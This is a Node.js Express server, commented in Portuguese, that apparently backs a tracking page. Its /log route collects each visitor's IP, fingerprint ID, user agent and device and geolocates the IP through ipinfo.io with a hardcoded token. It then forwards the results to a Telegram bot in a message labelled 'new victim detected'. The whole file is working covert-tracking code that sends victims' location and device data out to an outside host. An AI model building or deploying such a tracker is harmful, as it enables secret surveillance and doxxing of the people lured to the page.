const express = require('express');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');
const app = express();
const PORT = 3000;

// Variáveis do Render (.env)
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

app.use(bodyParser.json());

// Serve arquivos da pasta /public
app.use(express.static('public'));

// Rota principal "/" para servir index.html
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

// Rota que recebe o POST com os dados do visitante
app.post('/log', async (req, res) => {
  const data = req.body;

  const ipInfo = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`)
    .then(res => res.json());

  const mensagem = `
📡 NOVA VÍTIMA DETECTADA

🧠 ID: ${data.visitorId}
🌍 IP: ${data.ip}
📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
🏢 ISP: ${ipInfo.org}
🕵️‍♂️ Agente: ${data.userAgent}
📱 Dispositivo: ${data.device}
🔗 Lat/Long: ${ipInfo.loc}
`;

  // Envia mensagem para o bot do Telegram
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: mensagem
    })
  });

  res.sendStatus(200);
});

// Inicia servidor
app.listen(PORT, () => {
  console.log(`🦅 Servidor Falcão rodando: http://localhost:${PORT}`);
});
